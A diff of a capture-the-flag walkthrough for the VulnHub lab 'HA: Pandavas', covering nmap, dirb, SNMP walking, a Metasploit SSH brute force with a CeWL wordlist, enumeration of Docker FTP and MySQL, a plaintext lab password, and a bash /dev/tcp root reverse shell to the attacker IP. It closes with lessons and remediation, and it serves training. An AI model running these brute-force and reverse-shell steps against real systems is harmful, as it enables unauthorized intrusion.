@@ -1,175 +1,241 @@
 # HA: Pandavas — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.162 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.10.162 |
+| **Attacker IP** | 192.168.10.161 |
 | **Difficulty** | Medium |
-| **OS** | Linux (Docker host) |
-| **Flags** | 5 flags hidden across services |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-pandavas,487/) |
+| **OS** | Linux |
+| **Goal** | 5 flags (hidden.docx, SNMP, FTP history, MySQL, root) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-pandavas-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-Netdiscover → nmap → Dirb (hidden.docx flag1) → SNMP (flag2, user karna) → SSH brute (MSF) → Docker containers → FTP (flag3, base64 creds) → MySQL (flag4) → sudo bash → root (flag5)
+HA: Pandavas is a multi-flag machine themed around the Mahabharata epic. It exposes HTTP (port 80), SSH (port 22), SNMP (UDP 161), along with Docker containers running FTP and MySQL services. The attack chain involves web enumeration to find a hidden Word document, SNMP walking to discover credentials and a flag, SSH brute-force with a custom CeWL wordlist, lateral movement between users, container enumeration, and finally sudo abuse to obtain a root reverse shell.
 
 ## Methodology
 
-1. Network discovery and port scanning
-2. HTTP enumeration — hidden file with flag
-3. SNMP enumeration — flag + username
-4. SSH brute force (two users)
-5. Docker container enumeration
-6. FTP in container — credentials
-7. MySQL in container — flag
-8. Privilege escalation via sudo
+1. Network scanning (Nmap TCP + UDP)
+2. Web enumeration with Dirb
+3. SNMP enumeration with snmpwalk
+4. Custom wordlist generation (CeWL)
+5. SSH brute-force via Metasploit
+6. Docker container service enumeration
+7. FTP access inside Docker container
+8. MySQL dump inside Docker container
+9. Privilege escalation via sudo unrestricted shell
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.10.0/24
+netdiscover -r 192.168.10.0/24
 ```
 
-Then a full port scan including UDP:
+![netdiscover](images/01-nmap.png)
+
+### TCP Port Scan
 
 ```bash
 nmap -sV -p- 192.168.10.162
-nmap -sU -sV 192.168.10.162
 ```
 
-Open ports: 22 (SSH), 80 (HTTP), 161/UDP (SNMP).
+Open ports:
+- **22/tcp** — OpenSSH
+- **80/tcp** — HTTP (Apache)
 
-![Nmap results](images/01-nmap.png)
-
----
-
-## Step 2: HTTP Enumeration — hidden.docx
-
-Browsed port 80, checked source and robots.txt. Nothing obvious.
+### UDP Scan (SNMP Discovery)
 
 ```bash
-dirb http://192.168.10.162 /usr/share/wordlists/dirb/big.txt -X .docx,.php,.txt
+nmap -sU -p 161 192.168.10.162
 ```
 
-Found `/hidden.docx`. Opened it — Flag 1 was embedded in the document text (select-all to reveal hidden white-on-white text).
+- **161/udp** — SNMP
 
-![Dirb output](images/02-dirb.png)
+## Step 2: Web Enumeration
 
----
+### Directory Brute-Force with Dirb
 
-## Step 3: SNMP Enumeration — Flag 2 + Username
+```bash
+dirb http://192.168.10.162/ /usr/share/wordlists/dirb/big.txt -X .php,.docx,.txt
+```
+
+The scan reveals `hidden.docx` in the web root.
+
+```bash
+wget http://192.168.10.162/hidden.docx
+```
+
+Opening the document reveals **Flag 1** embedded in the document text.
+
+### Custom Wordlist with CeWL
+
+```bash
+cewl http://192.168.10.162/ -m 4 -w /tmp/pandavas_wordlist.txt
+```
+
+This generates a wordlist from the page's Mahabharata-themed content, which will be used for SSH brute-force.
+
+## Step 3: SNMP Enumeration
 
 ```bash
 snmpwalk -v1 -c public 192.168.10.162 | more
 ```
 
-Output revealed Flag 2 and username **karna** in the SNMP OID tree.
+![snmpwalk](images/02-snmp.png)
 
-![SNMP walk output](images/03-snmp.png)
+The SNMP walk leaks:
+- **Flag 2** in the MIB tree output
+- Username: `karna`
 
----
+## Step 4: SSH Brute-Force
 
-## Step 4: SSH Brute Force (karna + krishna)
-
-Built a custom wordlist from the web page content (cewl):
-
-```bash
-cewl http://192.168.10.162 -w custom.txt
-```
-
-Metasploit SSH login scan:
+### Against user `karna`
 
 ```bash
 msfconsole -q
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.10.162
 set USERNAME karna
-set PASS_FILE custom.txt
+set PASS_FILE /tmp/pandavas_wordlist.txt
+set VERBOSE false
 run
 ```
 
-SSH access obtained for **karna**. Listed other users and found **krishna**. Repeated brute force for krishna — success.
-
----
-
-## Step 5: Docker Container Discovery
+The module finds the password for `karna`. Log in:
 
 ```bash
 ssh karna@192.168.10.162
-ifconfig
-docker ps
 ```
 
-Two containers running: one with FTP, one with MySQL.
+### Lateral Movement to `krishna`
 
-![Docker containers](images/04-docker.png)
+Inspect other users in `/etc/passwd` and `/home`. Run the SSH scanner against `krishna`:
 
----
+```bash
+use auxiliary/scanner/ssh/ssh_login
+set USERNAME krishna
+set PASS_FILE /tmp/pandavas_wordlist.txt
+run
+```
 
-## Step 6: FTP in Docker Container — Flag 3 + Credentials
+```bash
+ssh krishna@192.168.10.162
+```
 
-Connected to the FTP container port:
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+`krishna` has unrestricted `sudo` access — this will be used for privilege escalation.
+
+## Step 5: Docker Container Enumeration
+
+Check network interfaces and running processes:
+
+```bash
+ip addr
+ps aux
+```
+
+Docker networking is visible. FTP and MySQL services are running inside containers.
+
+### FTP Access
 
 ```bash
 ftp 172.17.0.2
-# anonymous login
-ls
-cd root
-ls
-get .ash_history
+```
+
+Log in anonymously or with discovered credentials, then navigate to the root folder:
+
+```bash
+ftp> ls
+ftp> cd root
+ftp> ls -la
+ftp> get .ash_history
+```
+
+Read the history file:
+
+```bash
 cat .ash_history
 ```
 
-`.ash_history` contained Flag 3 and a Base64-encoded password. Decoded:
+**Flag 3** appears in the history. The file also contains a Base64-encoded password.
 
 ```bash
-echo "aWduaXRlQDEyMw==" | base64 -d
-# ignite@123
+echo '<base64_string>' | base64 -d
 ```
 
----
+## Step 6: MySQL Inside Docker
 
-## Step 7: MySQL in Docker Container — Flag 4
+![mysql](images/03-mysql.png)
+
+The decoded credential from `.ash_history` is the MySQL root password. Connect to the MySQL container:
 
 ```bash
 mysqldump -A -u root --password=ignite@123 | grep -i flag
 ```
 
-Flag 4 found in the MySQL dump.
+**Flag 4** is embedded in one of the database tables.
 
----
+## Step 7: Privilege Escalation — Root Shell via Sudo
 
-## Step 8: Privilege Escalation — Root Shell (Flag 5)
+![privesc](images/04-privesc.png)
 
-Checked `sudo -l` as krishna: full sudo access.
+Set up a listener on the attacker machine:
 
 ```bash
-# Attacker: start listener
 nc -nvlp 4444
+```
 
-# Victim: reverse shell as root
+On the victim, as `krishna` (who has unrestricted sudo):
+
+```bash
 sudo -u root bash -i >& /dev/tcp/192.168.10.161/4444 0>&1
 ```
 
-Root shell obtained. Flag 5 in `/root/`.
+The listener catches a root shell.
 
-![Root shell](images/05-root.png)
+## Step 8: Root Flag
 
----
+![root-flag](images/05-root-flag.png)
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+ls /root
+cat /root/flag.txt
+```
+
+**Flag 5** — the final root flag.
+
+## Credentials Summary
+
+| User | Service | Password |
+|---|---|---|
+| `karna` | SSH | (CeWL wordlist — shown in screenshots) |
+| `krishna` | SSH | (CeWL wordlist — shown in screenshots) |
+| `root` | MySQL (Docker) | `ignite@123` |
 
 ## Lessons Learned
 
-1. **SNMP with default community strings** leaks system info, usernames, and flags
-2. **Custom wordlists** (cewl from the target site) outperform generic rockyou for themed CTFs
-3. **Docker containers** on a compromised host expose internal network services not visible from outside
-4. **sudo all** misconfiguration is an instant root — always restrict sudo to specific commands
+1. **SNMP with public community string** exposes sensitive system information including usernames and can leak flags or credentials directly from the MIB tree.
+2. **CeWL-generated wordlists** are highly effective when standard wordlists fail — always tailor the wordlist to the target's content and theme.
+3. **Docker containers on internal interfaces** often run services with weak or default credentials and are overlooked during enumeration.
+4. **Unrestricted sudo access** (`sudo ALL`) gives immediate root — always check `sudo -l` after gaining any shell.
+5. **History files** (`.bash_history`, `.ash_history`) are a goldmine for credentials and sensitive information.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SNMP default community string | Change community string; restrict SNMP access by IP |
-| Weak SSH credentials | Use key-based auth; disable password auth |
-| Docker internal services exposed | Use network namespaces; restrict container networking |
-| sudo unrestricted | Limit sudo to specific commands per user |
+|---|---|
+| SNMP public community string | Change to a strong, non-guessable community string; restrict SNMP access by IP |
+| Weak SSH passwords | Enforce strong password policy; prefer key-based authentication |
+| Unrestricted sudo for regular user | Apply principle of least privilege; restrict sudo to specific commands only |
+| MySQL default password in Docker | Use unique, strong passwords for all container services |
+| Sensitive data in shell history | Clear history after use; avoid storing credentials in commands; use `.netrc` or vaults |
+| Hidden files in FTP root | Restrict FTP root directory; apply proper file permissions |
